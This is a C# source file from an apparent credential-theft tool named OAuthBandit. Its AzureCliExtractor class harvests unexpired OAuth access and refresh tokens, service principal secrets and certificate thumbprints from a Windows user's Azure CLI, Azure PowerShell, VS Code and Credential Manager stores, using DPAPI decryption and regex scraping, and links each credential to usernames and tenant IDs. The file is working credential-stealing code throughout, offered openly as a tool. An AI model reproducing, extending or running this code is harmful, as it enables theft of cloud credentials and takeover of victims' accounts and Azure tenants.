using System.Text;
using System.Text.Json;
using OAuthBandit.Core;
using OAuthBandit.Crypto;

namespace OAuthBandit.Extractors;

// extracts tokens from Azure CLI and Azure PowerShell local caches
// az cli stores plaintext json tokens in %USERPROFILE%\.azure\
// az powershell uses %USERPROFILE%\.Azure\ and %LOCALAPPDATA%\.IdentityService\
public class AzureCliExtractor : BaseExtractor
{
    private readonly List<string> _cachePaths = new();
    private readonly string _userProfile;
    private readonly string _localAppData;

    public AzureCliExtractor()
    {
        _userProfile = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);
        _localAppData = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);

        // az cli paths
        var azureDir = Path.Combine(_userProfile, ".azure");
        if (Directory.Exists(azureDir))
            _cachePaths.Add(azureDir);

        // az powershell paths (capital A)
        var azurePsDir = Path.Combine(_userProfile, ".Azure");
        if (Directory.Exists(azurePsDir) && azurePsDir != azureDir)
            _cachePaths.Add(azurePsDir);

        // identity service (msal shared cache)
        var identityDir = Path.Combine(_localAppData, ".IdentityService");
        if (Directory.Exists(identityDir))
            _cachePaths.Add(identityDir);
    }

    public override List<Token> Extract()
    {
        var tokens = new List<Token>();
        var seen = new HashSet<string>();

        if (_cachePaths.Count == 0)
        {
            Console.WriteLine("    ! no azure cli/ps cache found");
            return tokens;
        }

        Console.WriteLine($"    > {_cachePaths.Count} cache dir(s)");

        // 1. msal caches - scan all files matching msal/cache patterns
        // modern Az PS uses .IdentityService\mg.msal.cache.cae, msal.cache.cae, etc
        // az cli uses msal_token_cache.json or .bin
        foreach (var dir in _cachePaths)
        {
            foreach (var file in Directory.GetFiles(dir))
            {
                var fname = Path.GetFileName(file).ToLowerInvariant();

                // match any msal cache variant
                if (fname.Contains("msal") && (fname.Contains("cache") || fname.Contains("token")))
                {
                    var found = ParseMsalCacheFile(file, seen);
                    tokens.AddRange(found);
                }
            }
        }

        // 2. accessTokens.json (old az cli format, deprecated but still around)
        var oldCache = Path.Combine(_userProfile, ".azure", "accessTokens.json");
        if (File.Exists(oldCache))
        {
            var found = ParseLegacyAccessTokens(oldCache, seen);
            tokens.AddRange(found);
        }

        // 3. AzureRmContext.json (az powershell session context)
        foreach (var dir in _cachePaths)
        {
            var contextFile = Path.Combine(dir, "AzureRmContext.json");
            if (File.Exists(contextFile))
            {
                var found = ParseAzureRmContext(contextFile, seen);
                tokens.AddRange(found);
            }
        }

        // 4. TokenCache.dat (old az powershell)
        foreach (var dir in _cachePaths)
        {
            var datFile = Path.Combine(dir, "TokenCache.dat");
            if (File.Exists(datFile))
            {
                var found = ParseTokenCacheDat(datFile, seen);
                tokens.AddRange(found);
            }
        }

        // 5. azureProfile.json - subscription info (extract tenant ids)
        var profileFile = Path.Combine(_userProfile, ".azure", "azureProfile.json");
        if (File.Exists(profileFile))
            EnrichWithProfile(profileFile, tokens);

        // 6. service principal credentials from AzureRmContext.json
        int spCount = 0;
        foreach (var dir in _cachePaths)
        {
            var ctx = Path.Combine(dir, "AzureRmContext.json");
            if (File.Exists(ctx))
            {
                var found = ParseServicePrincipalCreds(ctx, seen);
                spCount += found.Count;
                tokens.AddRange(found);
            }
        }
        Console.WriteLine($"    > service principals: {spCount}");

        // 7. msal_http_cache.bin (msal http response cache, sometimes has tokens)
        int httpCount = 0;
        foreach (var dir in _cachePaths)
        {
            var httpCache = Path.Combine(dir, "msal_http_cache.bin");
            if (File.Exists(httpCache))
            {
                var found = ParseMsalHttpCache(httpCache, seen);
                httpCount += found.Count;
                tokens.AddRange(found);
            }
        }
        Console.WriteLine($"    > http cache: {httpCount}");

        // 8. VS Code Azure extension tokens
        var vscodeTokens = ParseVSCodeAzureTokens(seen);
        Console.WriteLine($"    > vscode: {vscodeTokens.Count}");
        tokens.AddRange(vscodeTokens);

        // 9. Windows Credential Manager (cmdkey stored creds for azure)
        var credMgrTokens = ParseCredentialManager(seen);
        Console.WriteLine($"    > credential manager: {credMgrTokens.Count}");
        tokens.AddRange(credMgrTokens);

        return tokens;
    }

    // smart loader: try plaintext json first, then dpapi decrypt
    // handles mg.msal.cache.cae (dpapi), msal_token_cache.json (plaintext), etc
    private List<Token> ParseMsalCacheFile(string filePath, HashSet<string> seen)
    {
        try
        {
            var raw = File.ReadAllBytes(filePath);
            if (raw.Length < 10) return new List<Token>();

            var fileName = Path.GetFileName(filePath);
            string? json = null;

            // try plaintext first
            var text = Encoding.UTF8.GetString(raw);
            if (text.TrimStart().StartsWith("{"))
            {
                json = text;
            }
            else
            {
                // dpapi encrypted (mg.msal.cache.cae, msal.cache.cae etc)
                var decrypted = CryptoUtils.DpapiDecrypt(raw);
                if (decrypted != null)
                {
                    var decText = Encoding.UTF8.GetString(decrypted);
                    if (decText.TrimStart().StartsWith("{"))
                        json = decText;
                }
            }

            if (json == null)
            {
                // last resort: regex for tokens in raw text
                var found = ExtractTokensFromText(text, fileName, filePath, "az cache", seen);
                return found;
            }

            var tokens = ParseMsalJsonContent(json, fileName, filePath, seen);
            if (tokens.Count > 0)
                Console.WriteLine($"    > {fileName}: {tokens.Count} token(s)");
            return tokens;
        }
        catch { return new List<Token>(); }
    }

    // kept for TokenCache.dat internal use
    private List<Token> ParseMsalTokenCache(string filePath, HashSet<string> seen)
    {
        var json = File.ReadAllText(filePath);
        return ParseMsalJsonContent(json, Path.GetFileName(filePath), filePath, seen);
    }

    // core msal json parser - handles AccessToken, RefreshToken, Account sections
    private List<Token> ParseMsalJsonContent(string json, string fileName, string filePath, HashSet<string> seen)
    {
        var tokens = new List<Token>();
        try
        {
            using var doc = JsonDocument.Parse(json);
            var root = doc.RootElement;

            // build account lookup: home_account_id -> username
            var accountMap = new Dictionary<string, string>(StringComparer.OrdinalIgnoreCase);
            if (root.TryGetProperty("Account", out var acctSection))
            {
                foreach (var entry in acctSection.EnumerateObject())
                {
                    try
                    {
                        var obj = entry.Value;
                        var homeId = obj.TryGetProperty("home_account_id", out var h) ? h.GetString() : null;
                        var username = obj.TryGetProperty("username", out var u) ? u.GetString() : null;
                        if (homeId != null && username != null)
                            accountMap[homeId] = username;
                    }
                    catch { }
                }
            }

            // access tokens
            if (root.TryGetProperty("AccessToken", out var atSection))
            {
                foreach (var entry in atSection.EnumerateObject())
                {
                    try
                    {
                        var obj = entry.Value;
                        var secret = obj.TryGetProperty("secret", out var s) ? s.GetString() : null;
                        if (string.IsNullOrEmpty(secret)) continue;

                        var dedupKey = secret.Length > 100 ? secret[..100] : secret;
                        if (!seen.Add($"AT:{dedupKey}")) continue;

                        var clientId = obj.TryGetProperty("client_id", out var c) ? c.GetString() : null;
                        var tenantId = obj.TryGetProperty("realm", out var r) ? r.GetString() : null;
                        var target = obj.TryGetProperty("target", out var t) ? t.GetString() : null;
                        var homeAcct = obj.TryGetProperty("home_account_id", out var ha) ? ha.GetString() : null;

                        // resolve upn from account map
                        string? upn = null;
                        if (homeAcct != null) accountMap.TryGetValue(homeAcct, out upn);

                        // check expiry
                        bool isExpired = false;
                        string? expiresAt = null;
                        if (obj.TryGetProperty("expires_on", out var exp))
                        {
                            var expStr = exp.ValueKind == JsonValueKind.String ? exp.GetString() : exp.ToString();
                            if (long.TryParse(expStr, out var expTs))
                            {
                                var dt = DateTimeOffset.FromUnixTimeSeconds(expTs).LocalDateTime;
                                expiresAt = dt.ToString("yyyy-MM-dd HH:mm:ss");
                                isExpired = dt < DateTime.Now;
                            }
                        }
                        if (isExpired) continue;

                        // if secret is a JWT, also try parsing for more metadata
                        if (secret.StartsWith("eyJ") && upn == null)
                        {
                            var payload = ParseJwtPayload(secret);
                            if (payload != null)
                                upn = GetJsonString(payload, "upn", "unique_name", "email", "preferred_username");
                        }

                        tokens.Add(new Token
                        {
                            TokenType = "access_token",
                            TokenValue = secret,
                            Application = IdentifyApplication(clientId, target) + " (az)",
                            ClientId = clientId,
                            TenantId = tenantId,
                            Scope = target,
                            Upn = upn,
                            SourceFile = fileName,
                            CachePath = filePath,
                            ExtractedAt = ExtractedAt,
                            ExpiresAt = expiresAt,
                            IsExpired = false
                        });
                    }
                    catch { }
                }
            }

            // refresh tokens
            if (root.TryGetProperty("RefreshToken", out var rtSection))
            {
                foreach (var entry in rtSection.EnumerateObject())
                {
                    try
                    {
                        var obj = entry.Value;
                        var secret = obj.TryGetProperty("secret", out var s) ? s.GetString() : null;
                        if (string.IsNullOrEmpty(secret)) continue;

                        var dedupKey = secret.Length > 100 ? secret[..100] : secret;
                        if (!seen.Add($"RT:{dedupKey}")) continue;

                        var clientId = obj.TryGetProperty("client_id", out var c) ? c.GetString() : null;
                        var homeAcct = obj.TryGetProperty("home_account_id", out var ha) ? ha.GetString() : null;

                        string? upn = null;
                        if (homeAcct != null) accountMap.TryGetValue(homeAcct, out upn);

                        tokens.Add(new Token
                        {
                            TokenType = "refresh_token",
                            TokenValue = secret,
                            Application = IdentifyApplication(clientId, null) + " (az)",
                            ClientId = clientId,
                            Upn = upn,
                            SourceFile = fileName,
                            CachePath = filePath,
                            ExtractedAt = ExtractedAt,
                            IsExpired = false
                        });
                    }
                    catch { }
                }
            }

            // id tokens (useful for user enumeration even if not directly usable)
            if (root.TryGetProperty("IdToken", out var idSection))
            {
                foreach (var entry in idSection.EnumerateObject())
                {
                    try
                    {
                        var obj = entry.Value;
                        var secret = obj.TryGetProperty("secret", out var s) ? s.GetString() : null;
                        if (string.IsNullOrEmpty(secret) || !secret.StartsWith("eyJ")) continue;

                        // parse jwt for user info and enrich existing tokens
                        var payload = ParseJwtPayload(secret);
                        if (payload == null) continue;
                        var idUpn = GetJsonString(payload, "upn", "preferred_username", "email");
                        var homeAcct = obj.TryGetProperty("home_account_id", out var ha) ? ha.GetString() : null;

                        // enrich tokens that share same home_account_id
                        if (idUpn != null)
                        {
                            foreach (var tok in tokens)
                            {
                                if (tok.Upn == null && tok.CachePath == filePath)
                                    tok.Upn = idUpn;
                            }
                        }
                    }
                    catch { }
                }
            }
        }
        catch { }
        return tokens;
    }

    // parse the old accessTokens.json format (array of token objects)
    private List<Token> ParseLegacyAccessTokens(string filePath, HashSet<string> seen)
    {
        var tokens = new List<Token>();
        try
        {
            var json = File.ReadAllText(filePath);
            using var doc = JsonDocument.Parse(json);

            if (doc.RootElement.ValueKind != JsonValueKind.Array) return tokens;

            foreach (var entry in doc.RootElement.EnumerateArray())
            {
                try
                {
                    // access token
                    if (entry.TryGetProperty("accessToken", out var at))
                    {
                        var val = at.GetString();
                        if (!string.IsNullOrEmpty(val))
                        {
                            var key = val.Length > 100 ? val[..100] : val;
                            if (seen.Add($"LAT:{key}"))
                            {
                                var resource = entry.TryGetProperty("resource", out var res) ? res.GetString() : null;
                                var userId = entry.TryGetProperty("userId", out var uid) ? uid.GetString() : null;
                                var tenantId = entry.TryGetProperty("_authority", out var auth) ? ExtractTenantFromAuthority(auth.GetString()) : null;

                                string? expiresAt = null;
                                bool isExpired = false;
                                if (entry.TryGetProperty("expiresOn", out var exp))
                                {
                                    if (DateTime.TryParse(exp.GetString(), out var dt))
                                    {
                                        expiresAt = dt.ToString("yyyy-MM-dd HH:mm:ss");
                                        isExpired = dt < DateTime.Now;
                                    }
                                }
                                if (!isExpired)
                                {
                                    tokens.Add(new Token
                                    {
                                        TokenType = "access_token",
                                        TokenValue = val,
                                        Application = "Azure CLI (legacy)",
                                        Scope = resource,
                                        Upn = userId,
                                        TenantId = tenantId,
                                        SourceFile = "accessTokens.json",
                                        CachePath = filePath,
                                        ExtractedAt = ExtractedAt,
                                        ExpiresAt = expiresAt,
                                        IsExpired = false
                                    });
                                }
                            }
                        }
                    }

                    // refresh token in same entry
                    if (entry.TryGetProperty("refreshToken", out var rt))
                    {
                        var val = rt.GetString();
                        if (!string.IsNullOrEmpty(val))
                        {
                            var key = val.Length > 100 ? val[..100] : val;
                            if (seen.Add($"LRT:{key}"))
                            {
                                var userId = entry.TryGetProperty("userId", out var uid) ? uid.GetString() : null;

                                tokens.Add(new Token
                                {
                                    TokenType = "refresh_token",
                                    TokenValue = val,
                                    Application = "Azure CLI (legacy)",
                                    Upn = userId,
                                    SourceFile = "accessTokens.json",
                                    CachePath = filePath,
                                    ExtractedAt = ExtractedAt,
                                    IsExpired = false
                                });
                            }
                        }
                    }
                }
                catch { }
            }

            if (tokens.Count > 0)
                Console.WriteLine($"    > accessTokens.json (legacy): {tokens.Count} token(s)");
        }
        catch { }
        return tokens;
    }

    // parse AzureRmContext.json for embedded tokens
    private List<Token> ParseAzureRmContext(string filePath, HashSet<string> seen)
    {
        var tokens = new List<Token>();
        try
        {
            var json = File.ReadAllText(filePath);

            // just regex for tokens in the whole blob - the structure is deeply nested
            foreach (System.Text.RegularExpressions.Match m in Constants.JwtPattern.Matches(json))
            {
                var jwt = m.Groups[1].Value;
                var key = jwt.Length > 100 ? jwt[..100] : jwt;
                if (!seen.Add($"CTX:{key}")) continue;

                var payload = ParseJwtPayload(jwt);
                if (payload == null) continue;

                var clientId = GetClientIdWithAudFallback(payload);
                var upn = GetJsonString(payload, "upn", "unique_name", "email", "preferred_username");
                var tenantId = GetJsonString(payload, "tid");
                var scope = GetJsonString(payload, "scp");

                string? expiresAt = null;
                bool isExpired = false;
                var exp = GetJsonLong(payload, "exp");
                if (exp.HasValue)
                {
                    var dt = DateTimeOffset.FromUnixTimeSeconds(exp.Value).LocalDateTime;
                    expiresAt = dt.ToString("yyyy-MM-dd HH:mm:ss");
                    isExpired = dt < DateTime.Now;
                }
                if (isExpired) continue;

                tokens.Add(new Token
                {
                    TokenType = "access_token",
                    TokenValue = jwt,
                    Application = IdentifyApplication(clientId, scope) + " (az ps)",
                    ClientId = clientId,
                    Upn = upn,
                    TenantId = tenantId,
                    Scope = scope,
                    SourceFile = "AzureRmContext.json",
                    CachePath = filePath,
                    ExtractedAt = ExtractedAt,
                    ExpiresAt = expiresAt,
                    IsExpired = false
                });
            }

            // also look for refresh tokens (long base64 strings starting with specific patterns)
            foreach (System.Text.RegularExpressions.Match m in Constants.RefreshTokenPattern.Matches(json))
            {
                var rt = m.Groups[1].Value;
                if (rt.Length <= 200) continue;
                var key = rt[..100];
                if (!seen.Add($"CTXRT:{key}")) continue;

                var (clientId, tenantId) = ExtractRefreshTokenMetadata(rt);

                tokens.Add(new Token
                {
                    TokenType = "refresh_token",
                    TokenValue = rt,
                    Application = "Azure PowerShell",
                    ClientId = clientId,
                    TenantId = tenantId,
                    SourceFile = "AzureRmContext.json",
                    CachePath = filePath,
                    ExtractedAt = ExtractedAt,
                    IsExpired = false
                });
            }

            if (tokens.Count > 0)
                Console.WriteLine($"    > AzureRmContext.json: {tokens.Count} token(s)");
        }
        catch { }
        return tokens;
    }

    // TokenCache.dat is dpapi encrypted on windows
    private List<Token> ParseTokenCacheDat(string filePath, HashSet<string> seen)
    {
        var tokens = new List<Token>();
        try
        {
            var encrypted = File.ReadAllBytes(filePath);
            if (encrypted.Length < 100) return tokens;

            // try dpapi decrypt
            var decrypted = CryptoUtils.DpapiDecrypt(encrypted);
            if (decrypted == null) return tokens;

            var text = Encoding.UTF8.GetString(decrypted);

            // try parsing as msal json cache
            if (text.TrimStart().StartsWith("{"))
            {
                // write to temp, parse as msal
                var tempPath = Path.GetTempFileName();
                File.WriteAllText(tempPath, text);
                var found = ParseMsalTokenCache(tempPath, seen);
                // fix source file name
                foreach (var t in found)
                {
                    t.SourceFile = "TokenCache.dat";
                    t.CachePath = filePath;
                    t.Application = t.Application.Replace("az cli", "az ps");
                }
                tokens.AddRange(found);
                try { File.Delete(tempPath); } catch { }
            }
            else
            {
                // fallback: regex for tokens in decrypted blob
                foreach (System.Text.RegularExpressions.Match m in Constants.JwtPattern.Matches(text))
                {
                    var jwt = m.Groups[1].Value;
                    var key = jwt.Length > 100 ? jwt[..100] : jwt;
                    if (!seen.Add($"DAT:{key}")) continue;

                    var payload = ParseJwtPayload(jwt);
                    if (payload == null) continue;

                    var clientId = GetClientIdWithAudFallback(payload);
                    var upn = GetJsonString(payload, "upn", "unique_name", "email", "preferred_username");

                    tokens.Add(new Token
                    {
                        TokenType = "access_token",
                        TokenValue = jwt,
                        Application = "Azure PowerShell (dat)",
                        ClientId = clientId,
                        Upn = upn,
                        SourceFile = "TokenCache.dat",
                        CachePath = filePath,
                        ExtractedAt = ExtractedAt,
                        IsExpired = false
                    });
                }
            }

            if (tokens.Count > 0)
                Console.WriteLine($"    > TokenCache.dat: {tokens.Count} token(s)");
        }
        catch { }
        return tokens;
    }

    // add tenant info from azureProfile.json to tokens that dont have it
    private void EnrichWithProfile(string filePath, List<Token> tokens)
    {
        try
        {
            var json = File.ReadAllText(filePath);
            using var doc = JsonDocument.Parse(json);

            if (!doc.RootElement.TryGetProperty("subscriptions", out var subs)) return;
            if (subs.ValueKind != JsonValueKind.Array) return;

            string? defaultTenant = null;
            foreach (var sub in subs.EnumerateArray())
            {
                if (sub.TryGetProperty("tenantId", out var tid))
                {
                    defaultTenant ??= tid.GetString();
                    if (sub.TryGetProperty("isDefault", out var def) && def.GetBoolean())
                        defaultTenant = tid.GetString();
                }
            }

            if (defaultTenant == null) return;

            foreach (var t in tokens)
            {
                if (t.TenantId == null)
                    t.TenantId = defaultTenant;
            }
        }
        catch { }
    }

    private static string? ExtractTenantFromAuthority(string? authority)
    {
        if (authority == null) return null;
        var parts = authority.TrimEnd('/').Split('/');
        var last = parts.LastOrDefault();
        if (last != null && Constants.GuidPattern.IsMatch(last))
            return last;
        return null;
    }

    // extract service principal credentials from AzureRmContext.json
    // when Connect-AzAccount -ServicePrincipal is used, client_id + secret are stored in plaintext
    private List<Token> ParseServicePrincipalCreds(string filePath, HashSet<string> seen)
    {
        var tokens = new List<Token>();
        try
        {
            var json = File.ReadAllText(filePath);
            using var doc = JsonDocument.Parse(json);

            // look for ServicePrincipalSecret patterns in the json blob
            // structure varies but typically under Contexts -> <name> -> Account -> ExtendedProperties
            var text = doc.RootElement.ToString();

            // find all client secrets (typically base64-ish or guid-like values after "ServicePrincipalSecret")
            var spSecretPattern = new System.Text.RegularExpressions.Regex(
                @"""ServicePrincipalSecret""\s*:\s*""([^""]+)""",
                System.Text.RegularExpressions.RegexOptions.IgnoreCase);

            var spIdPattern = new System.Text.RegularExpressions.Regex(
                @"""ServicePrincipalId""\s*:\s*""([^""]+)""",
                System.Text.RegularExpressions.RegexOptions.IgnoreCase);

            var tenantPattern = new System.Text.RegularExpressions.Regex(
                @"""TenantId""\s*:\s*""([a-f0-9\-]{36})""",
                System.Text.RegularExpressions.RegexOptions.IgnoreCase);

            // also check for CertificateThumbprint (sp auth via cert)
            var certPattern = new System.Text.RegularExpressions.Regex(
                @"""CertificateThumbprint""\s*:\s*""([A-Fa-f0-9]{40})""",
                System.Text.RegularExpressions.RegexOptions.IgnoreCase);

            var secrets = spSecretPattern.Matches(text);
            var spIds = spIdPattern.Matches(text);
            var tenants = tenantPattern.Matches(text);
            var certs = certPattern.Matches(text);

            // combine sp_id + secret pairs
            for (int i = 0; i < secrets.Count; i++)
            {
                var secret = secrets[i].Groups[1].Value;
                var spId = i < spIds.Count ? spIds[i].Groups[1].Value : null;
                var tenant = i < tenants.Count ? tenants[i].Groups[1].Value : null;

                var dedupKey = $"SP:{spId}:{secret[..Math.Min(secret.Length, 20)]}";
                if (!seen.Add(dedupKey)) continue;

                // store as a special token type - client_id:secret format
                tokens.Add(new Token
                {
                    TokenType = "sp_credential",
                    TokenValue = $"{spId}:{secret}",
                    Application = "Service Principal (az ps)",
                    ClientId = spId,
                    TenantId = tenant,
                    SourceFile = "AzureRmContext.json",
                    CachePath = filePath,
                    ExtractedAt = ExtractedAt,
                    IsExpired = false
                });
            }

            // certificate thumbprints
            for (int i = 0; i < certs.Count; i++)
            {
                var thumbprint = certs[i].Groups[1].Value;
                var spId = i < spIds.Count ? spIds[i].Groups[1].Value : null;
                var tenant = i < tenants.Count ? tenants[i].Groups[1].Value : null;

                var dedupKey = $"CERT:{thumbprint}";
                if (!seen.Add(dedupKey)) continue;

                tokens.Add(new Token
                {
                    TokenType = "sp_certificate",
                    TokenValue = $"{spId}:cert:{thumbprint}",
                    Application = "Service Principal Cert (az ps)",
                    ClientId = spId,
                    TenantId = tenant,
                    SourceFile = "AzureRmContext.json",
                    CachePath = filePath,
                    ExtractedAt = ExtractedAt,
                    IsExpired = false
                });
            }

            if (tokens.Count > 0)
                Console.WriteLine($"    > service principals: {tokens.Count} credential(s)");
        }
        catch { }
        return tokens;
    }

    // msal_http_cache.bin sometimes contains token responses in json
    private List<Token> ParseMsalHttpCache(string filePath, HashSet<string> seen)
    {
        var tokens = new List<Token>();
        try
        {
            var raw = File.ReadAllBytes(filePath);
            if (raw.Length < 50) return tokens;

            // try reading as utf8 text and grep for tokens
            var text = Encoding.UTF8.GetString(raw);

            foreach (System.Text.RegularExpressions.Match m in Constants.JwtPattern.Matches(text))
            {
                var jwt = m.Groups[1].Value;
                var key = jwt.Length > 100 ? jwt[..100] : jwt;
                if (!seen.Add($"HTTP:{key}")) continue;

                var payload = ParseJwtPayload(jwt);
                if (payload == null) continue;

                var clientId = GetClientIdWithAudFallback(payload);
                var upn = GetJsonString(payload, "upn", "unique_name", "email", "preferred_username");
                var tenantId = GetJsonString(payload, "tid");

                string? expiresAt = null;
                bool isExpired = false;
                var exp = GetJsonLong(payload, "exp");
                if (exp.HasValue)
                {
                    var dt = DateTimeOffset.FromUnixTimeSeconds(exp.Value).LocalDateTime;
                    expiresAt = dt.ToString("yyyy-MM-dd HH:mm:ss");
                    isExpired = dt < DateTime.Now;
                }
                if (isExpired) continue;

                tokens.Add(new Token
                {
                    TokenType = "access_token",
                    TokenValue = jwt,
                    Application = IdentifyApplication(clientId, null) + " (http cache)",
                    ClientId = clientId,
                    Upn = upn,
                    TenantId = tenantId,
                    SourceFile = "msal_http_cache.bin",
                    CachePath = filePath,
                    ExtractedAt = ExtractedAt,
                    ExpiresAt = expiresAt,
                    IsExpired = false
                });
            }

            // also check for refresh tokens
            foreach (System.Text.RegularExpressions.Match m in Constants.RefreshTokenPattern.Matches(text))
            {
                var rt = m.Groups[1].Value;
                if (rt.Length <= 200) continue;
                var key = rt[..100];
                if (!seen.Add($"HTTPRT:{key}")) continue;

                tokens.Add(new Token
                {
                    TokenType = "refresh_token",
                    TokenValue = rt,
                    Application = "Azure (http cache)",
                    SourceFile = "msal_http_cache.bin",
                    CachePath = filePath,
                    ExtractedAt = ExtractedAt,
                    IsExpired = false
                });
            }

            if (tokens.Count > 0)
                Console.WriteLine($"    > msal_http_cache.bin: {tokens.Count} token(s)");
        }
        catch { }
        return tokens;
    }

    // VS Code stores azure tokens in its credential store
    // on windows its in %APPDATA%\Code\User\globalStorage\ms-vscode.azure-account\
    // and also in sqlite db at %APPDATA%\Code\User\globalStorage\state.vscdb
    private List<Token> ParseVSCodeAzureTokens(HashSet<string> seen)
    {
        var tokens = new List<Token>();
        try
        {
            var appdata = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);

            // check multiple vscode variants
            var vscodeDirs = new[]
            {
                Path.Combine(appdata, "Code", "User", "globalStorage"),
                Path.Combine(appdata, "Code - Insiders", "User", "globalStorage"),
                Path.Combine(appdata, "VSCodium", "User", "globalStorage"),
            };

            foreach (var gsDir in vscodeDirs)
            {
                if (!Directory.Exists(gsDir)) continue;

                // azure account extension stores tokens
                var azureAcctDir = Path.Combine(gsDir, "ms-vscode.azure-account");
                if (Directory.Exists(azureAcctDir))
                {
                    foreach (var file in Directory.GetFiles(azureAcctDir, "*.json"))
                    {
                        try
                        {
                            var text = File.ReadAllText(file);
                            var found = ExtractTokensFromText(text, Path.GetFileName(file), file, "VS Code", seen);
                            tokens.AddRange(found);
                        }
                        catch { }
                    }
                }

                // also check the vscdb sqlite database for azure tokens
                // its a sqlite db but tokens are stored as plaintext json values
                // we can just grep the raw bytes for jwt patterns
                var stateDb = Path.Combine(gsDir, "state.vscdb");
                if (File.Exists(stateDb))
                {
                    try
                    {
                        var raw = File.ReadAllText(stateDb, Encoding.UTF8);
                        var found = ExtractTokensFromText(raw, "state.vscdb", stateDb, "VS Code", seen);
                        tokens.AddRange(found);
                    }
                    catch { }
                }
            }

            if (tokens.Count > 0)
                Console.WriteLine($"    > vscode: {tokens.Count} token(s)");
        }
        catch { }
        return tokens;
    }

    // windows credential manager - azure/ms creds stored via cmdkey
    // path: %LOCALAPPDATA%\Microsoft\Credentials\ (dpapi encrypted)
    // also check for any azure-related creds in the generic credential store
    private List<Token> ParseCredentialManager(HashSet<string> seen)
    {
        var tokens = new List<Token>();
        try
        {
            // generic credentials are in %LOCALAPPDATA%\Microsoft\Credentials\
            var credDir = Path.Combine(_localAppData, "Microsoft", "Credentials");
            if (!Directory.Exists(credDir)) return tokens;

            foreach (var file in Directory.GetFiles(credDir))
            {
                try
                {
                    var encrypted = File.ReadAllBytes(file);
                    if (encrypted.Length < 50 || encrypted.Length > 100000) continue;

                    var decrypted = CryptoUtils.DpapiDecrypt(encrypted);
                    if (decrypted == null) continue;

                    var text = Encoding.UTF8.GetString(decrypted);

                    // check if it contains azure/microsoft related data
                    if (!text.Contains("microsoft", StringComparison.OrdinalIgnoreCase) &&
                        !text.Contains("azure", StringComparison.OrdinalIgnoreCase) &&
                        !text.Contains("graph", StringComparison.OrdinalIgnoreCase))
                        continue;

                    var found = ExtractTokensFromText(text, Path.GetFileName(file), file, "CredManager", seen);
                    tokens.AddRange(found);
                }
                catch { }
            }

            if (tokens.Count > 0)
                Console.WriteLine($"    > credential manager: {tokens.Count} token(s)");
        }
        catch { }
        return tokens;
    }

    // helper: extract jwt + refresh tokens from any text blob
    private List<Token> ExtractTokensFromText(string text, string sourceFile, string cachePath, string appLabel, HashSet<string> seen)
    {
        var tokens = new List<Token>();

        foreach (System.Text.RegularExpressions.Match m in Constants.JwtPattern.Matches(text))
        {
            var jwt = m.Groups[1].Value;
            var key = jwt.Length > 100 ? jwt[..100] : jwt;
            if (!seen.Add($"{appLabel}:{key}")) continue;

            var payload = ParseJwtPayload(jwt);
            if (payload == null) continue;

            var clientId = GetClientIdWithAudFallback(payload);
            var upn = GetJsonString(payload, "upn", "unique_name", "email", "preferred_username");
            var tenantId = GetJsonString(payload, "tid");

            string? expiresAt = null;
            bool isExpired = false;
            var exp = GetJsonLong(payload, "exp");
            if (exp.HasValue)
            {
                var dt = DateTimeOffset.FromUnixTimeSeconds(exp.Value).LocalDateTime;
                expiresAt = dt.ToString("yyyy-MM-dd HH:mm:ss");
                isExpired = dt < DateTime.Now;
            }
            if (isExpired) continue;

            tokens.Add(new Token
            {
                TokenType = "access_token",
                TokenValue = jwt,
                Application = IdentifyApplication(clientId, null) + $" ({appLabel})",
                ClientId = clientId,
                Upn = upn,
                TenantId = tenantId,
                SourceFile = sourceFile,
                CachePath = cachePath,
                ExtractedAt = ExtractedAt,
                ExpiresAt = expiresAt,
                IsExpired = false
            });
        }

        foreach (System.Text.RegularExpressions.Match m in Constants.RefreshTokenPattern.Matches(text))
        {
            var rt = m.Groups[1].Value;
            if (rt.Length <= 200) continue;
            var key = rt[..100];
            if (!seen.Add($"{appLabel}RT:{key}")) continue;

            var (clientId, tenantId) = ExtractRefreshTokenMetadata(rt);

            tokens.Add(new Token
            {
                TokenType = "refresh_token",
                TokenValue = rt,
                Application = $"Azure ({appLabel})",
                ClientId = clientId,
                TenantId = tenantId,
                SourceFile = sourceFile,
                CachePath = cachePath,
                ExtractedAt = ExtractedAt,
                IsExpired = false
            });
        }

        return tokens;
    }
}
